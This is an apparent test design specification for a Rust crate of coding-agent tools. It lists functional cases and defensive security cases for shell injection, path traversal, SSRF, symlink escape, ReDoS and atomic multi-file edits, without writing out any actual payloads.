description: E2E test case designs for opencode-tools crate - Tool implementations and registry

test_cases.title: ToolRegistry registration and lookup
test_cases.description: Test registering tools and looking them up by name

test_cases.title: ReadTool file reading with schema validation
test_cases.description: Test ReadTool executes correctly with valid arguments
steps: Create temp file with content 'hello world'
expected_outcomes: File content correctly read and returned
Tool handles non-existent files gracefully with error

test_cases.title: WriteTool file creation and overwrite protection
test_cases.description: Test WriteTool creates files and handles existing files
steps: Execute WriteTool to create new file
Verify file exists with correct content
Execute WriteTool again to same file

test_cases.title: BashTool command execution with timeout
test_cases.description: Test BashTool executes commands and respects timeout
steps: Execute BashTool with 'echo hello' - verify success

test_cases.title: GrepTool pattern search
test_cases.description: Test GrepTool finds patterns in files
steps: Verify matches returned with file paths and line numbers
Execute with no matches - verify empty result

test_cases.title: MultiEditTool atomic multi-file edits
test_cases.description: Test MultiEditTool applies multiple edits atomically
steps: If one edit fails, verify no files changed

test_cases.title: GlobTool pattern matching
test_cases.description: Test GlobTool finds files by pattern
steps: Execute with 'src/**/*' - verify only src files

test_cases.title: LspTool code navigation
test_cases.description: Test LspTool provides go-to-definition and find-references
steps: Start LSP server for Rust project

test_cases.title: WebFetchTool URL content retrieval
test_cases.description: Test WebFetchTool fetches web content
steps: Execute with invalid URL - verify error

test_cases.title: Tool safety classification
test_cases.description: Test is_safe() returns correct values per tool

test_cases.title: BashTool shell injection prevention
test_cases.description: CRITICAL: BashTool must reject commands with shell injection payloads. RCE risk if bypassed.
test_cases.risk_addressed: Remote code execution via untrusted input in bash tool
test_cases.preconditions: ToolRegistry with BashTool registered, permission scope ReadOnly
steps: For each injection payload, execute BashTool with payload
Verify no command was actually executed server-side
expected_outcomes: All injection attempts rejected with error
Command string not passed to shell unchanged
Exit code never 0 for rejected commands
Error message does not reveal shell behavior
post_checks: Tool remains registered and functional for legitimate commands

test_cases.title: BashTool path traversal prevention
test_cases.description: BashTool must reject commands attempting to access files outside allowed scope
test_cases.risk_addressed: Access files outside allowed workspace scope
test_cases.preconditions: ToolRegistry with BashTool registered, workspace root is /tmp/opencode_test
steps: For each path traversal attempt, execute BashTool
expected_outcomes: Tool returns error without accessing files
No file content returned for traversal attempts
post_checks: Tool still functional for legitimate commands

test_cases.title: WebFetchTool SSRF prevention
test_cases.description: CRITICAL: WebFetchTool must reject requests to internal/sensitive addresses. SSRF risk.
test_cases.risk_addressed: Server-side request forgery to internal infrastructure
steps: For each internal/SSRF target URL, execute WebFetchTool
Verify no network request was made to the target
post_checks: Tool still functional for legitimate public URLs
Tool returns correct data for public URLs like http://example.com

test_cases.title: ReadTool symlink and special file handling
test_cases.description: CRITICAL: ReadTool must not follow symlinks or read special files outside workspace scope
test_cases.risk_addressed: Sandbox escape via symlink or reading sensitive special files
steps: Create workspace with symlinks to sensitive paths
Create device files and FIFOs in workspace
Attempt to read each path via ReadTool
expected_outcomes: Symlink resolution returns error OR points within workspace
Device files return error 'not a regular file'
post_checks: ReadTool still works for regular files within workspace

test_cases.title: BashTool signal handling during execution
test_cases.description: BashTool must handle signals (SIGINT, SIGTERM) during long-running commands
test_cases.risk_addressed: Zombie processes or hung tool execution after signal
steps: Verify command is killed after timeout
Verify command tree is killed (yes process also terminated)
expected_outcomes: Timeout kills the process group, not just parent
Tool returns timeout error, not hangs

test_cases.title: WriteTool path traversal and overwrite protection
test_cases.description: WriteTool must prevent writing outside workspace and handle dangerous overwrites
test_cases.risk_addressed: Path traversal write, overwriting system files
steps: Attempt to write to path outside workspace
Attempt to write through symlink to /etc
Attempt to write to non-existent directory path
expected_outcomes: Non-existent directory path returns descriptive error
post_checks: WriteTool still functional for valid paths

test_cases.title: ReadTool oversized file handling
test_cases.description: ReadTool must handle oversized files without memory exhaustion
test_cases.risk_addressed: Memory exhaustion via reading huge file
steps: Create file larger than reasonable limit (e.g., 1GB)
Verify process memory does not spike
expected_outcomes: Tool returns error for oversized file
Process does not OOM or crash
post_checks: Tool remains functional for normal-sized files

test_cases.title: GrepTool catastrophic backtracking prevention
test_cases.description: GrepTool must prevent regex catastrophic backtracking (ReDoS)
test_cases.risk_addressed: Denial of service via malicious regex
steps: Execute GrepTool with ReDoS-prone regex on large input
Set a timeout for the operation
Verify timeout fires before regex consumes all CPU
expected_outcomes: Tool returns timeout error, not hangs indefinitely
Process does not consume 100% CPU for >5 seconds
post_checks: Tool still functional with normal regexes

test_cases.title: GlobTool symlink loop prevention
test_cases.description: GlobTool must detect and prevent infinite loops from symlink cycles
test_cases.risk_addressed: Infinite loop when globbing directory with symlink cycles
steps: Create directory structure with symlink cycle: dir/ -> dir/
post_checks: Tool still functional after cycle detection

test_cases.title: BashTool empty and whitespace-only commands
test_cases.description: BashTool must handle empty commands, whitespace, and special shell builtins
steps: For each test case, execute BashTool

test_cases.title: MultiEditTool partial failure atomicity
test_cases.description: When MultiEditTool partially fails, verify ALL changes are rolled back
test_cases.risk_addressed: Partial write leaving files in inconsistent state
test_cases.preconditions: ToolRegistry with MultiEditTool registered, 3 files prepared
steps: Prepare edits to 3 files with valid content
Modify one file to have read-only permissions
Verify error returned for the blocked edit
Verify the other 2 files are UNCHANGED (rolled back)
expected_outcomes: Error returned for the failed edit
Other files NOT modified (rolled back atomically)
post_checks: MultiEditTool still functional for new edits

test_cases.title: MultiEditTool concurrent execution
test_cases.description: Two MultiEditTool executions on overlapping files must not corrupt each other
test_cases.risk_addressed: Concurrent writes to same file causing data corruption
steps: Create file shared.txt with initial content
Execute MultiEditTool A: append 'A' to shared.txt
Execute MultiEditTool B: append 'B' to shared.txt simultaneously
Verify content is either 'AB' or 'BA', not corruption like 'AAB'
expected_outcomes: One edit completes before the other (no interleaving)
Final content is deterministic based on order

test_cases.title: ToolRegistry handles duplicate registration gracefully
test_cases.description: Registering the same tool twice must not panic or leak
expected_outcomes: Last registration wins OR error returned

test_cases.title: ToolRegistry unregister and reregister
test_cases.description: Tools can be removed and re-added to registry
